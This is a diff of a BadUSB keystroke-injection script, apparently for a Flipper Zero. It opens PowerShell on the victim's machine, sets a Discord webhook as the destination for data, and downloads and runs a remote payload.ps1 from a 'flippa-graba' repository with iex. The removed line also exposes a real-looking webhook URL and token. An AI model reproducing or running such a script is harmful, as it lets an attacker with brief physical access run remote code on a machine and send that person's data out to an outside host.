@@ -9,7 +9,7 @@ STRING powershell
 ENTER
 DELAY 1000
 REM edit your webhook here
-STRING $DiscordUrl = 'https://discord.com/api/webhooks/1152479419995263007/SFEJy_CFtlbtrZD1-KeF4HpzZ1fHd5hYmduGNXj-Y3kAM3diTGtOaZKNvhk1OdbbB7tH'
+STRING $DiscordUrl = 'Add Your Webhook here'
 ENTER
 STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/AidanStuff/flippa-graba/main/payload.ps1'))
 ENTER
